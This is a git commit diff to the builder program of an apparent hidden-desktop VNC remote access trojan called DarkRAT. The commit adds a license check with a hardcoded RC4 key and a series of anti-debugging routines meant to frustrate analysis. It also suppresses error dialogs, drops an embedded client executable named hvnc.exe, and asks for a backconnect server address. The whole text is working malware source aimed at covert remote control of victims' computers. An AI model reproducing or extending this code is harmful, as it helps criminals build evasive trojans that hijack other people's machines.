43eb8d014bf7742233824c5581e358f34a9550e7
darkspiderbots <lenna15h08elli@gmail.com>
2019-08-25 15:05:44 +0200

    Added Licensing Base

--- Builder/dark_hiddenDesktopBuilder/dark_hiddenDesktopBuilder.cpp
+++ Builder/dark_hiddenDesktopBuilder/dark_hiddenDesktopBuilder.cpp
@@ -2,10 +2,24 @@
 //
 #include <Windows.h>
 #include <iostream>
-#include "Runpe.h"
-#include "rawControllServer.h"
+#include <sstream>
+#include <fstream>
 #include <string>
 
+#include "base64.h"
+#include "antidbg.h"
+#include "Runpe.h"
+#include "rc4.h"
+#include "rawControllServer.h"
+#include "rawClient.h"
+#include "json.hpp"
+
+
+long WINAPI unhandled_exception_handler(EXCEPTION_POINTERS* p_exceptions)
+{
+	(void*)p_exceptions;
+	return EXCEPTION_EXECUTE_HANDLER;
+}
 
 void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
 {
@@ -15,8 +29,63 @@ void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
 	EndUpdateResource(hResource, FALSE);
 }
 
+std::string readFile()
+{
+	std::stringstream str;
+	std::ifstream stream("darkrat.lic");
+	if (stream.is_open())
+	{
+		while (stream.peek() != EOF)
+		{
+			str << (char)stream.get();
+		}
+		stream.close();
+		return str.str();
+	}
+	else {
+		return "false";
+	}
+}
+
 int main()
 {
+
+	SetUnhandledExceptionFilter(unhandled_exception_handler);
+	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
+	_set_abort_behavior(0, _WRITE_ABORT_MSG | _CALL_REPORTFAULT);
+	adbg_IsDebuggerPresent();
+	adbg_IsDebuggerPresent();
+	adbg_CheckRemoteDebuggerPresent();
+	adbg_BeingDebuggedPEB();
+	adbg_NtGlobalFlagPEB();
+	adbg_HardwareDebugRegisters();
+	adbg_RDTSC();
+	adbg_QueryPerformanceCounter();
+	adbg_GetTickCount();
+
+	std::string user;
+	std::string license = readFile();
+	if (license == "false") {
+		return 0;
+	}
+
+	std::cout << "Username:"; std::cin >> user;
+
+	darkvnc::crypto::RC4 rc4;
+	std::string enckey = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";
+	std::string toDecrypt;
+	toDecrypt = rc4.doRC4(base64_decode(license.c_str()), (char*)enckey.c_str());
+	char* c_wwrite = &toDecrypt[0u];
+	//system("cls");
+	json::JSON j_config = json::Object();
+	j_config = json::JSON::Load(toDecrypt);
+	if (j_config["username"].ToString() != user) {
+		return 0;
+	}
+	system("cls");
+	std::cout << "Welcome Back '" + user + "'  \n\n";
+
+
 std::cout << R"(
   ____             _      _   ___     ___   _  ____ 
  |  _ \  __ _ _ __| | __ | | | \ \   / / \ | |/ ___|
@@ -48,6 +117,19 @@ std::cout << R"(
 		if (input == "1") {
 
 			system("cls");
+
+			std::cout << "Writing Base Bin..\n";
+			remove("hvnc.exe");
+			DWORD Res;
+			HANDLE hFile = CreateFile(L"hvnc.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (INVALID_HANDLE_VALUE == hFile) {
+				return false;
+			}
+			WriteFile(hFile, rawClient, sizeof(rawClient), &Res, NULL);
+			CloseHandle(hFile);
+			Sleep(1000);
+
+
 			std::string write;
 			std::cout << "Enter your Backconnect Server: (127.0.0.1)\n";
 			std::cin >> write;
